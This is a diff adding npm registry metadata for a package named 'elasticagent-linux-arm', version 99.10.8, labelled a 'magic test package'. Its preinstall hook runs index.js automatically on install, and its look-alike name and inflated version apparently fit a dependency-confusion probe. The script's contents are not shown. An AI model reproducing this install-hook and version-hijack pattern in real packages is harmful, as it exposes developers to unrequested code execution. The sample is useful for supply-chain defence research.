@@ -1,0 +1,39 @@
+{
+    "name": "elasticagent-linux-arm",
+    "version": "99.10.8",
+    "description": "magic test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "elasticagent-linux-arm@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-crbnxVW1iS6H/Fg7DRWbnpG13A3IMpaCXx8L4bvymT000+D7KUbdCPMyph/KVuiICZ3Kdn7Kxl4ndXqsbAfYUg==",
+        "shasum": "947bf48ec959a0ff35d5438d5110752ee5f2b3d8",
+        "tarball": "https://registry.npmjs.org/elasticagent-linux-arm/-/elasticagent-linux-arm-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3228,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmnt+CRA9TVsSAnZWagAAKfgP/0rjIgIkqpEJ8mTVS21H\nfbbn9w4PaZILtISpXwbb5blvE9pnsV2nIQpsnnyX2xZmutA3Fx/OOZBRZo3R\niWv6UKqjOE2HZD2NXCuUXcyfvz3Viz2fGkRqNmkshDwXhcHOmLXYXWYzNEtu\ndRbehLfTXoxtageqDQFFW2jy0ISRtPYKyueirJ2EhS+ctaxlmDHqZOGTYlax\naSUWl9d+R9+6Hh3nHNZ7TS/x4q9MimaSK9GVzPolZNJKLTJ6Qyp17ky18Frx\nIwrNZ1UaCqoekBhmF2ze/X6T8ZGK9b/b0W5UzliUDnRYsTENO2pT+bUgitfC\nRLCep3XO+c1KgUejXGeJYK0OyKmb8CPI+7d93zh/YcMu7NAAqEAVeQ9Iux0F\nh+450WeNoe8ZWCDkVKxyAbHyTsdadM5tJH/PFhqpvv96JUgdyMEk9ro12I+0\nrbXmQYOiG20o2jdVcWlhqFHIeg6rLMK82yfa3uX6tv9YUciucjCWjIWpc25z\nnt63pndFazyhN1cpbZ5tJKSv3l6KMkmkvigBzzKRmXgXmH7d1UwFSiRS49Bn\nlAJkL8r0i6TrwLLAu9XQf+MNThfqZqCHAUigTLFDx9htvtbSYBh95Ap2obdK\nDgJzYxqfl6ZDOWLoGZ6/mdLsYIEQXVm1/MFlNWP6VtuScHMmBkvlsL2936fA\nOe9P\r\n=Zdmi\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/elasticagent-linux-arm_99.10.8_1637514110060_0.13652596650571658"
+    },
+    "_hasShrinkwrap": false
+}
